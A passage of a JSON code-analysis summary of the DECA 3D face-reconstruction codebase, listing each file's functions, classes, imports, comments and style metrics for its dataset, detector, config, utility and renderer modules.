          "from decalib.datasets import datasets",
          "from decalib.utils import util",
          "from decalib.utils.config import cfg as deca_cfg"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "#",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# Using this computer program means that you agree to the terms",
          "# in the LICENSE file included with this software distribution.",
          "# Any use not explicitly granted by the LICENSE is prohibited.",
          "#",
          "# Copyright\u00a92019 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# For comments or questions, please email us at deca@tue.mpg.de",
          "# For commercial licensing contact, please contact ps-license@tuebingen.mpg.de",
          "# load test images",
          "# run DECA",
          "# identity reference",
          "# -- expression transfer",
          "# exp code from image",
          "# transfer exp code",
          "# -- save results",
          "# rendering option",
          "# process test images",
          "# save"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/datasets/aflw2000.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, testpath='/ps/scratch/yfeng/Data/AFLW2000/GT', crop_size=224):",
          "def __len__(self):",
          "def __getitem__(self, index):"
        ],
        "class_defs": [
          "class AFLW2000(Dataset):"
        ],
        "imports": [
          "import os, sys",
          "import torch",
          "import torchvision.transforms as transforms",
          "import numpy as np",
          "import cv2",
          "import scipy",
          "from skimage.io import imread, imsave",
          "from skimage.transform import estimate_transform, warp, resize, rescale",
          "from glob import glob",
          "from torch.utils.data import Dataset, DataLoader, ConcatDataset",
          "import scipy.io"
        ],
        "comments": [
          "# crop image",
          "# 'tform': tform,",
          "# 'original_image': torch.tensor(image.transpose(2,0,1)).float(),"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/datasets/vox.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, K, image_size, scale, trans_scale = 0, dataname='vox2', n_train=100000, isTemporal=False, isEval=False, isSingle=False):",
          "def __len__(self):",
          "def __getitem__(self, idx):",
          "def crop(self, image, kpt):",
          "def load_mask(self, maskpath, h, w):"
        ],
        "class_defs": [
          "class VoxelDataset(Dataset):"
        ],
        "imports": [
          "import os, sys",
          "import torch",
          "import torchvision.transforms as transforms",
          "import numpy as np",
          "import cv2",
          "import scipy",
          "from skimage.io import imread, imsave",
          "from skimage.transform import estimate_transform, warp, resize, rescale",
          "from glob import glob",
          "from torch.utils.data import Dataset, DataLoader, ConcatDataset"
        ],
        "comments": [
          "# if key not in self.face_dict.keys():",
          "#     self.face_dict[key] = []",
          "# clean version: filter out images with bad lanmark labels, may lack extreme pose example",
          "# filter face",
          "### crop information",
          "## crop",
          "# normalized kpt",
          "###",
          "# translate center",
          "# crop image",
          "# cropped_image = warp(image, tform.inverse, output_shape=(self.image_size, self.image_size))",
          "# # change kpt accordingly",
          "# cropped_kpt = np.dot(tform.params, np.hstack([kpt, np.ones([kpt.shape[0],1])]).T).T # np.linalg.inv(tform.params)",
          "# print(maskpath)",
          "# atts = ['skin', 'l_brow', 'r_brow', 'l_eye', 'r_eye', 'eye_g', 'l_ear', 'r_ear', 'ear_r',",
          "#     'nose', 'mouth', 'u_lip', 'l_lip', 'neck', 'neck_l', 'cloth', 'hair', 'hat']",
          "# for i in range(1, 16):"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 1,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/datasets/vggface.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, K, image_size, scale, trans_scale = 0, isTemporal=False, isEval=False, isSingle=False):",
          "def __len__(self):",
          "def __getitem__(self, idx):",
          "def crop(self, image, kpt):",
          "def load_mask(self, maskpath, h, w):",
          "def __init__(self, K, image_size, scale, trans_scale = 0, isTemporal=False, isEval=False, isSingle=False):",
          "def __len__(self):",
          "def __getitem__(self, idx):",
          "def crop(self, image, kpt):",
          "def load_mask(self, maskpath, h, w):"
        ],
        "class_defs": [
          "class VGGFace2Dataset(Dataset):",
          "class VGGFace2HQDataset(Dataset):"
        ],
        "imports": [
          "import os, sys",
          "import torch",
          "import torchvision.transforms as transforms",
          "import numpy as np",
          "import cv2",
          "import scipy",
          "from skimage.io import imread, imsave",
          "from skimage.transform import estimate_transform, warp, resize, rescale",
          "from glob import glob",
          "from torch.utils.data import Dataset, DataLoader, ConcatDataset"
        ],
        "comments": [
          "# hq:",
          "# datafile = '/ps/scratch/face2d3d/texture_in_the_wild_code/VGGFace2_cleaning_codes/ringnetpp_training_lists/second_cleaning/vggface2_bbx_size_bigger_than_400_train_list_max_normal_100_ring_5_1_serial.npy'",
          "### crop information",
          "## crop",
          "# normalized kpt",
          "###",
          "# translate center",
          "# crop image",
          "# cropped_image = warp(image, tform.inverse, output_shape=(self.image_size, self.image_size))",
          "# # change kpt accordingly",
          "# cropped_kpt = np.dot(tform.params, np.hstack([kpt, np.ones([kpt.shape[0],1])]).T).T # np.linalg.inv(tform.params)",
          "# print(maskpath)",
          "# atts = ['skin', 'l_brow', 'r_brow', 'l_eye', 'r_eye', 'eye_g', 'l_ear', 'r_ear', 'ear_r',",
          "#     'nose', 'mouth', 'u_lip', 'l_lip', 'neck', 'neck_l', 'cloth', 'hair', 'hat']",
          "# for i in range(1, 16):",
          "# hq:",
          "# datafile = '/ps/scratch/face2d3d/texture_in_the_wild_code/VGGFace2_cleaning_codes/ringnetpp_training_lists/second_cleaning/vggface2_bbx_size_bigger_than_400_train_list_max_normal_100_ring_5_1_serial.npy'",
          "### crop information",
          "## crop",
          "# normalized kpt",
          "###",
          "# translate center",
          "# crop image",
          "# cropped_image = warp(image, tform.inverse, output_shape=(self.image_size, self.image_size))",
          "# # change kpt accordingly",
          "# cropped_kpt = np.dot(tform.params, np.hstack([kpt, np.ones([kpt.shape[0],1])]).T).T # np.linalg.inv(tform.params)",
          "# print(maskpath)",
          "# atts = ['skin', 'l_brow', 'r_brow', 'l_eye', 'r_eye', 'eye_g', 'l_ear', 'r_ear', 'ear_r',",
          "#     'nose', 'mouth', 'u_lip', 'l_lip', 'neck', 'neck_l', 'cloth', 'hair', 'hat']",
          "# for i in range(1, 16):"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/datasets/build_datasets.py",
        "docstrings": [],
        "function_defs": [
          "def build_train(config, is_train=True):",
          "def build_val(config, is_train=True):"
        ],
        "class_defs": [],
        "imports": [
          "import os, sys",
          "import torch",
          "from torch.utils.data import Dataset, ConcatDataset",
          "import torchvision.transforms as transforms",
          "import numpy as np",
          "import cv2",
          "import scipy",
          "from skimage.io import imread, imsave",
          "from skimage.transform import estimate_transform, warp, resize, rescale",
          "from glob import glob",
          "from .vggface import VGGFace2Dataset",
          "from .ethnicity import EthnicityDataset",
          "from .aflw2000 import AFLW2000",
          "from .now import NoWDataset",
          "from .vox import VoxelDataset"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/datasets/datasets.py",
        "docstrings": [],
        "function_defs": [
          "def video2sequence(video_path, sample_step=10):",
          "def __init__(self, testpath, iscrop=True, crop_size=224, scale=1.25, face_detector='fan', sample_step=10):",
          "def __len__(self):",
          "def bbox2point(self, left, right, top, bottom, type='bbox'):",
          "def __getitem__(self, index):"
        ],
        "class_defs": [
          "class TestData(Dataset):"
        ],
        "imports": [
          "import os, sys",
          "import torch",
          "from torch.utils.data import Dataset, DataLoader",
          "import torchvision.transforms as transforms",
          "import numpy as np",
          "import cv2",
          "import scipy",
          "from skimage.io import imread, imsave",
          "from skimage.transform import estimate_transform, warp, resize, rescale",
          "from glob import glob",
          "import scipy.io",
          "from . import detectors"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "#",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# Using this computer program means that you agree to the terms",
          "# in the LICENSE file included with this software distribution.",
          "# Any use not explicitly granted by the LICENSE is prohibited.",
          "#",
          "# Copyright\u00a92019 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# For comments or questions, please email us at deca@tue.mpg.de",
          "# For commercial licensing contact, please contact ps-license@tuebingen.mpg.de",
          "# if count%sample_step == 0:",
          "# print('total {} images'.format(len(self.imagepath_list)))",
          "# elif face_detector == 'mtcnn':",
          "#     self.face_detector = detectors.MTCNN()",
          "# provide kpt as txt file, or mat file (for AFLW2000)"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 1,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/datasets/now.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, ring_elements=6, crop_size=224, scale=1.6):",
          "def __len__(self):",
          "def __getitem__(self, index):"
        ],
        "class_defs": [
          "class NoWDataset(Dataset):"
        ],
        "imports": [
          "import os, sys",
          "import torch",
          "import torchvision.transforms as transforms",
          "import numpy as np",
          "import cv2",
          "import scipy",
          "from skimage.io import imread, imsave",
          "from skimage.transform import estimate_transform, warp, resize, rescale",
          "from glob import glob",
          "from torch.utils.data import Dataset, DataLoader, ConcatDataset"
        ],
        "comments": [
          "# self.data_path = '/ps/scratch/face2d3d/ringnetpp/eccv/test_data/evaluation/NoW_Dataset/final_release_version/test_image_paths_ring_6_elements.npy'",
          "# self.imagepath = '/ps/scratch/face2d3d/ringnetpp/eccv/test_data/evaluation/NoW_Dataset/final_release_version/iphone_pictures/'",
          "# self.bbxpath = '/ps/scratch/face2d3d/ringnetpp/eccv/test_data/evaluation/NoW_Dataset/final_release_version/detected_face/'",
          "# box = np.array([[bbx_data['left'], bbx_data['top']], [bbx_data['right'], bbx_data['bottom']]]).astype('float32')",
          "# crop image",
          "# 'tform': tform,",
          "# 'original_image': torch.tensor(image.transpose(2,0,1)).float(),"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/datasets/detectors.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self):",
          "def run(self, image):",
          "def __init__(self, device = 'cpu'):",
          "def run(self, input):"
        ],
        "class_defs": [
          "class FAN(object):",
          "class MTCNN(object):"
        ],
        "imports": [
          "import numpy as np",
          "import torch",
          "import face_alignment",
          "from facenet_pytorch import MTCNN as mtcnn"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "#",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# Using this computer program means that you agree to the terms",
          "# in the LICENSE file included with this software distribution.",
          "# Any use not explicitly granted by the LICENSE is prohibited.",
          "#",
          "# Copyright\u00a92019 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# For comments or questions, please email us at deca@tue.mpg.de",
          "# For commercial licensing contact, please contact ps-license@tuebingen.mpg.de"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/datasets/train_datasets.py",
        "docstrings": [],
        "function_defs": [
          "def build_dataloader(config, is_train=True):",
          "def __init__(self, K, image_size, scale, trans_scale = 0, dataname='vox2', n_train=100000, isTemporal=False, isEval=False, isSingle=False):",
          "def __len__(self):",
          "def __getitem__(self, idx):",
          "def crop(self, image, kpt):",
          "def load_mask(self, maskpath, h, w):",
          "def __init__(self, image_size, scale, trans_scale = 0, isEval=False):",
          "def __len__(self):",
          "def __getitem__(self, idx):",
          "def crop(self, image, kpt):",
          "def load_mask(self, maskpath, h, w):",
          "def __init__(self, image_size, scale, trans_scale = 0, isEval=False):",
          "def __len__(self):",
          "def __getitem__(self, idx):",
          "def crop(self, image, kpt):",
          "def load_mask(self, maskpath, h, w):",
          "def video2sequence(video_path):",
          "def __init__(self, testpath, iscrop=True, crop_size=224, scale=1.25, face_detector='fan', face_detector_model=None):",
          "def __len__(self):",
          "def __getitem__(self, index):",
          "def __init__(self, testpath, kptfolder, iscrop=True, crop_size=224, scale=1.25, face_detector='fan', face_detector_model=None):",
          "def __len__(self):",
          "def __getitem__(self, index):"
        ],
        "class_defs": [
          "class VoxelDataset(Dataset):",
          "class COCODataset(Dataset):",
          "class CelebAHQDataset(Dataset):",
          "class TestData(Dataset):",
          "class EvalData(Dataset):"
        ],
        "imports": [
          "import os, sys",
          "import torch",
          "from torch.utils.data import Dataset, DataLoader, ConcatDataset",
          "import torchvision.transforms as transforms",
          "import numpy as np",
          "import cv2",
          "import scipy",
          "from skimage.io import imread, imsave",
          "from skimage.transform import estimate_transform, warp, resize, rescale",
          "from glob import glob",
          "from . import detectors"
        ],
        "comments": [
          "# print('---- data length: ', len(train_dataset))",
          "# if key not in self.face_dict.keys():",
          "#     self.face_dict[key] = []",
          "# clean version: filter out images with bad lanmark labels, may lack extreme pose example",
          "# filter face",
          "### crop information",
          "## crop",
          "# normalized kpt",
          "###",
          "# translate center",
          "# crop image",
          "# cropped_image = warp(image, tform.inverse, output_shape=(self.image_size, self.image_size))",
          "# # change kpt accordingly",
          "# cropped_kpt = np.dot(tform.params, np.hstack([kpt, np.ones([kpt.shape[0],1])]).T).T # np.linalg.inv(tform.params)",
          "# print(maskpath)",
          "# atts = ['skin', 'l_brow', 'r_brow', 'l_eye', 'r_eye', 'eye_g', 'l_ear', 'r_ear', 'ear_r',",
          "#     'nose', 'mouth', 'u_lip', 'l_lip', 'neck', 'neck_l', 'cloth', 'hair', 'hat']",
          "# for i in range(1, 16):",
          "# 53877 faces",
          "### crop information",
          "## crop",
          "# normalized kpt",
          "###",
          "# 'mask': mask_array",
          "# crop image",
          "# cropped_image = warp(image, tform.inverse, output_shape=(self.image_size, self.image_size))",
          "# # change kpt accordingly",
          "# cropped_kpt = np.dot(tform.params, np.hstack([kpt, np.ones([kpt.shape[0],1])]).T).T # np.linalg.inv(tform.params)",
          "# print(maskpath)",
          "# atts = ['skin', 'l_brow', 'r_brow', 'l_eye', 'r_eye', 'eye_g', 'l_ear', 'r_ear', 'ear_r',",
          "#     'nose', 'mouth', 'u_lip', 'l_lip', 'neck', 'neck_l', 'cloth', 'hair', 'hat']",
          "# for i in range(1, 16):",
          "# 53877 faces",
          "# print(kpt_path, kpt.shape)",
          "# kpt = kpt[:,:2]",
          "### crop information",
          "## crop",
          "# normalized kpt",
          "###",
          "# 'mask': mask_array",
          "# crop image",
          "# src_pts = np.array([[center[0]-size/2, center[1]-size/2], [center[0] - size/2, center[1]+size/2], [center[0]+size/2, center[1]-size/2]])",
          "# cropped_image = warp(image, tform.inverse, output_shape=(self.image_size, self.image_size))",
          "# # change kpt accordingly",
          "# cropped_kpt = np.dot(tform.params, np.hstack([kpt, np.ones([kpt.shape[0],1])]).T).T # np.linalg.inv(tform.params)",
          "# print(maskpath)",
          "# atts = ['skin', 'l_brow', 'r_brow', 'l_eye', 'r_eye', 'eye_g', 'l_ear', 'r_ear', 'ear_r',",
          "#     'nose', 'mouth', 'u_lip', 'l_lip', 'neck', 'neck_l', 'cloth', 'hair', 'hat']",
          "# for i in range(1, 16):",
          "########################## testing",
          "# import ipdb; ipdb.set_trace()",
          "# print(image.shape)",
          "# print(image_small.shape)",
          "# exit()",
          "# d = detected_faces[0].rect ## only use the first detected face (assume that each input image only contains one face)",
          "# left = d.left(); right = d.right(); top = d.top(); bottom = d.bottom()",
          "# print('total {} images'.format(len(self.imagepath_list)))"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 1,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/datasets/ethnicity.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, K, image_size, scale, trans_scale = 0, isTemporal=False, isEval=False, isSingle=False):",
          "def __len__(self):",
          "def __getitem__(self, idx):",
          "def crop(self, image, kpt):",
          "def load_mask(self, maskpath, h, w):"
        ],
        "class_defs": [
          "class EthnicityDataset(Dataset):"
        ],
        "imports": [
          "import os, sys",
          "import torch",
          "import torchvision.transforms as transforms",
          "import numpy as np",
          "import cv2",
          "import scipy",
          "from skimage.io import imread, imsave",
          "from skimage.transform import estimate_transform, warp, resize, rescale",
          "from glob import glob",
          "from torch.utils.data import Dataset, DataLoader, ConcatDataset"
        ],
        "comments": [
          "# hq:",
          "# datafile = '/ps/scratch/face2d3d/texture_in_the_wild_code/VGGFace2_cleaning_codes/ringnetpp_training_lists/second_cleaning/vggface2_bbx_size_bigger_than_400_train_list_max_normal_100_ring_5_1_serial.npy'",
          "### crop information",
          "## crop",
          "# normalized kpt",
          "###",
          "# translate center",
          "# crop image",
          "# cropped_image = warp(image, tform.inverse, output_shape=(self.image_size, self.image_size))",
          "# # change kpt accordingly",
          "# cropped_kpt = np.dot(tform.params, np.hstack([kpt, np.ones([kpt.shape[0],1])]).T).T # np.linalg.inv(tform.params)",
          "# print(maskpath)",
          "# atts = ['skin', 'l_brow', 'r_brow', 'l_eye', 'r_eye', 'eye_g', 'l_ear', 'r_ear', 'ear_r',",
          "#     'nose', 'mouth', 'u_lip', 'l_lip', 'neck', 'neck_l', 'cloth', 'hair', 'hat']",
          "# for i in range(1, 16):"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/utils/config.py",
        "docstrings": [],
        "function_defs": [
          "def get_cfg_defaults():\n\"\"\"Get a yacs CfgNode object with default values for my_project.\"\"\"\n# Return a clone so that the defaults will not be altered\n# This is for the \"local variable\" use pattern\nreturn cfg.clone()\n\ndef update_cfg(cfg, cfg_file):\ncfg.merge_from_file(cfg_file)\nreturn cfg.clone()\n",
          "def update_cfg(cfg, cfg_file):",
          "def parse_args():"
        ],
        "class_defs": [],
        "imports": [
          "from yacs.config import CfgNode as CN",
          "import argparse",
          "import yaml",
          "import os"
        ],
        "comments": [
          "# ---------------------------------------------------------------------------- #",
          "# Options for Face model",
          "# ---------------------------------------------------------------------------- #",
          "# texture data original from http://files.is.tue.mpg.de/tbolkart/FLAME/FLAME_texture_data.zip",
          "# face recognition model",
          "## details",
          "# ---------------------------------------------------------------------------- #",
          "# Options for Dataset",
          "# ---------------------------------------------------------------------------- #",
          "# cfg.dataset.training_data = ['ethnicity']",
          "# ---------------------------------------------------------------------------- #",
          "# Options for training",
          "# ---------------------------------------------------------------------------- #",
          "# ---------------------------------------------------------------------------- #",
          "# Options for Losses",
          "# ---------------------------------------------------------------------------- #",
          "# loss for detail",
          "# Return a clone so that the defaults will not be altered",
          "# This is for the \"local variable\" use pattern",
          "# import ipdb; ipdb.set_trace()"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/utils/util.py",
        "docstrings": [],
        "function_defs": [
          "def upsample_mesh(vertices, normals, faces, displacement_map, texture_map, dense_template):",
          "def write_obj(obj_name,",
          "def load_obj(obj_filename):\n\"\"\" Ref: https://github.com/facebookresearch/pytorch3d/blob/25c065e9dafa90163e7cec873dbb324a637c68b7/pytorch3d/io/obj_io.py\nLoad a mesh from a file-like object.\n\"\"\"",
          "def generate_triangles(h, w, margin_x=2, margin_y=5, mask = None):",
          "def face_vertices(vertices, faces):\n\"\"\"\n:param vertices: [batch size, number of vertices, 3]\n:param faces: [batch size, number of faces, 3]\n:return: [batch size, number of faces, 3, 3]\n\"\"\"",
          "def vertex_normals(vertices, faces):\n\"\"\"\n:param vertices: [batch size, number of vertices, 3]\n:param faces: [batch size, number of faces, 3]\n:return: [batch size, number of vertices, 3]\n\"\"\"",
          "def batch_orth_proj(X, camera):",
          "def gaussian(window_size, sigma):",
          "def gauss_fcn(x):",
          "def get_gaussian_kernel(kernel_size: int, sigma: float):\nr\"\"\"Function that returns Gaussian filter coefficients.\n\nArgs:\nkernel_size (int): filter size. It should be odd and positive.\nsigma (float): gaussian standard deviation.\n\nReturns:\nTensor: 1D tensor with gaussian filter coefficients.\n",
          "def get_gaussian_kernel2d(kernel_size, sigma):\nr\"\"\"Function that returns Gaussian filter matrix coefficients.\n\nArgs:\nkernel_size (Tuple[int, int]): filter sizes in the x and y direction.\nSizes should be odd and positive.\nsigma (Tuple[int, int]): gaussian standard deviation in the x and y\ndirection.\n\nReturns:",
          "def gaussian_blur(x, kernel_size=(3,3), sigma=(0.8,0.8)):",
          "def _compute_binary_kernel(window_size):\nr\"\"\"Creates a binary kernel to extract the patches. If the window size\nis HxW will create a (H*W)xHxW kernel.\n\"\"\"",
          "def median_blur(x, kernel_size=(3,3)):",
          "def get_laplacian_kernel2d(kernel_size: int):\nr\"\"\"Function that returns Gaussian filter matrix coefficients.\n\nArgs:\nkernel_size (int): filter size should be odd.\n\nReturns:\nTensor: 2D tensor with laplacian filter matrix coefficients.\n\nShape:",
          "def laplacian(x):",
          "def angle2matrix(angles):",
          "def binary_erosion(tensor, kernel_size=5):",
          "def flip_image(src_image, kps):",
          "def copy_state_dict(cur_state_dict, pre_state_dict, prefix='', load_name=None):",
          "def _get_params(key):",
          "def check_mkdir(path):",
          "def check_mkdirlist(pathlist):",
          "def tensor2image(tensor):",
          "def dict2obj(d):",
          "def __init__(self, **kwargs):",
          "def remove_module(state_dict):",
          "def dict_tensor2npy(tensor_dict):",
          "def plot_kpts(image, kpts, color = 'r'):",
          "def plot_verts(image, kpts, color = 'r'):",
          "def tensor_vis_landmarks(images, landmarks, gt_landmarks=None, color = 'g', isScale=True):",
          "def load_local_mask(image_size=256, mode='bbx'):",
          "def visualize_grid(visdict, savepath=None, size=224, dim=1, return_gird=True):"
        ],
        "class_defs": [
          "class C(object):",
          "class Struct(object):"
        ],
        "imports": [
          "import numpy as np",
          "import torch",
          "import torch.nn.functional as F",
          "import math",
          "from collections import OrderedDict",
          "import os",
          "from scipy.ndimage import morphology",
          "from skimage.io import imsave",
          "import cv2",
          "import torchvision"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "#",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# Using this computer program means that you agree to the terms",
          "# in the LICENSE file included with this software distribution.",
          "# Any use not explicitly granted by the LICENSE is prohibited.",
          "#",
          "# Copyright\u00a92019 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# For comments or questions, please email us at deca@tue.mpg.de",
          "# For commercial licensing contact, please contact ps-license@tuebingen.mpg.de",
          "# borrowed from https://github.com/YadiraF/PRNet/blob/master/utils/write.py",
          "# mesh lab start with 1, python/c++ start from 0",
          "# write obj",
          "# first line: write mtlib(material library)",
          "# f.write('# %s\\n' % os.path.basename(obj_name))",
          "# f.write('#\\n')",
          "# f.write('\\n')",
          "# write vertices",
          "# write uv coords",
          "# write f: ver ind/ uv ind",
          "#  faces[i, 2], uvfaces[i, 2],",
          "#  faces[i, 1], uvfaces[i, 1],",
          "#  faces[i, 0], uvfaces[i, 0]",
          "# write mtl",
          "# out_normal_map = normal_map / (np.linalg.norm(",
          "#     normal_map, axis=-1, keepdims=True) + 1e-9)",
          "# out_normal_map = (out_normal_map + 1) * 0.5",
          "# (out_normal_map * 255).astype(np.uint8)[:, :, ::-1]",
          "## load obj,  similar to load_obj from pytorch3d",
          "# startswith expects each line to be a string. If the file is read in as",
          "# bytes then first decode to strings.",
          "# Update face properties info.",
          "# Vertex index.",
          "# Texture index is present e.g. f 4/1/1.",
          "# ---------------------------- process/generate vertices, normals, faces",
          "# quad layout:",
          "# 0 1 ... w-1",
          "# w w+1",
          "#.",
          "# w*h",
          "# borrowed from https://github.com/daniilidis-group/neural_renderer/blob/master/neural_renderer/vertices_to_faces.py",
          "# pytorch only supports long and byte tensors for indexing",
          "# pytorch only supports long and byte tensors for indexing",
          "# -------------------------------------- image processing",
          "# borrowed from: https://torchgeometry.readthedocs.io/en/latest/_modules/kornia/filters",
          "# https://torchgeometry.readthedocs.io/en/latest/_modules/kornia/filters/laplacian.html",
          "# Rz.dot(Ry.dot(Rx))",
          "# tensor: [bz, 1, h, w].",
          "# -------------------------------------- io",
          "# print('parameter {} not found'.format(k))",
          "# print('copy param {} failed'.format(k))",
          "# if isinstance(d, list):",
          "#     d = [dict2obj(x) for x in d]",
          "# original saved file with DataParallel",
          "# create new OrderedDict that does not contain `module.`",
          "# ---------------------------------- visualization",
          "# visualize landmarks",
          "############### for training",
          "# UV space face attributes bbx in size 2048 (l r t b)",
          "# face = np.array([512, 1536, 512, 1536]) #",
          "# if image_size == 512:",
          "# face = np.array([400, 400+512*2, 400, 400+512*2])",
          "# face = np.array([512, 512+512*2, 512, 512+512*2])"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 9,
        "error_handling": 7,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/utils/renderer.py",
        "docstrings": [],
        "function_defs": [
          "def set_rasterizer(type = 'pytorch3d'):",
          "def __init__(self, height, width=None):\n\"\"\"\nuse fixed raster_settings for rendering faces\n\"\"\"",
          "def forward(self, vertices, faces, attributes=None, h=None, w=None):",
          "def __init__(self, image_size=224):\n\"\"\"\nuse fixed raster_settings for rendering faces\n\"\"\"",
          "def forward(self, vertices, faces, attributes=None, h=None, w=None):",
          "def __init__(self, image_size, obj_filename, uv_size=256, rasterizer_type='pytorch3d'):",
          "def forward(self, vertices, transformed_vertices, albedos, lights=None, h=None, w=None, light_type='point', background=None):",
          "def add_SHlight(self, normal_images, sh_coeff):",
          "def add_pointlight(self, vertices, normals, lights):",
          "def add_directionlight(self, normals, lights):",
          "def render_shape(self, vertices, transformed_vertices, colors = None, images=None, detail_normal_images=None,",
          "def render_depth(self, transformed_vertices):",
          "def render_colors(self, transformed_vertices, colors):",
          "def world2uv(self, vertices):"
        ],
        "class_defs": [
          "class StandardRasterizer(nn.Module):",
          "class Pytorch3dRasterizer(nn.Module):",
          "class SRenderY(nn.Module):"
        ],
        "imports": [
          "import numpy as np",
          "import torch",
          "import torch.nn as nn",
          "import torch.nn.functional as F",
          "from skimage.io import imread",
          "import imageio",
          "from . import util",
          "from pytorch3d.structures import Meshes",
          "from pytorch3d.io import load_obj",
          "from pytorch3d.renderer.mesh import rasterize_meshes",
          "import os",
          "from .util import load_obj",
          "from torch.utils.cpp_extension import load, CUDA_HOME",
          "from standard_rasterize_cuda import standard_rasterize"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "#",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# Using this computer program means that you agree to the terms",
          "# in the LICENSE file included with this software distribution.",
          "# Any use not explicitly granted by the LICENSE is prohibited.",
          "#",
          "# Copyright\u00a92019 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# For comments or questions, please email us at deca@tue.mpg.de",
          "# For commercial licensing contact, please contact ps-license@tuebingen.mpg.de",
          "# Use JIT Compiling Extensions",
          "# ref: https://pytorch.org/tutorials/advanced/cpp_extension.html",
          "# If JIT does not work, try manually installation first",
          "# 1. see instruction here: pixielib/utils/rasterizer/INSTALL.md",
          "# 2. add this: \"from .rasterizer.standard_rasterize_cuda import standard_rasterize\" here",
          "# compatibale with pytorch3d ndc, see https://github.com/facebookresearch/pytorch3d/blob/e42b0c4f704fa0f5e262f370dccac537b5edf2b1/pytorch3d/csrc/rasterize_meshes/rasterize_meshes.cu#L232",
          "#",
          "## TODO: add support for rendering non-squared images, since pytorc3d supports this now",
          "# print(image_size)",
          "# import ipdb; ipdb.set_trace()",
          "# faces",
          "# uv coords",
          "# shape colors, for rendering shape overlay",
          "## SH factors for lighting",
          "## rasterizer near 0 far 100. move mesh so minz larger than 0",
          "# attributes",
          "# rasterize",
          "####",
          "# vis mask",
          "# albedo",
          "# visible mask for pixels with positive normal direction",
          "# shading",
          "# normals_dot_lights = torch.clamp((normals[:,None,:,:]*directions_to_lights).sum(dim=3), 0., 1.)",
          "# normals_dot_lights = torch.clamp((normals[:,None,:,:]*directions_to_lights).sum(dim=3), 0., 1.)",
          "# normals_dot_lights = (normals[:,None,:,:]*directions_to_lights).sum(dim=3)",
          "# set lighting",
          "# Attributes",
          "# rasterize",
          "# import ipdb; ipdb.set_trace()",
          "####",
          "# albedo",
          "# mask",
          "# shading",
          "# Attributes",
          "# rasterize",
          "####",
          "# Attributes",
          "# rasterize",
          "####"
        ],
        "type_hints": false,
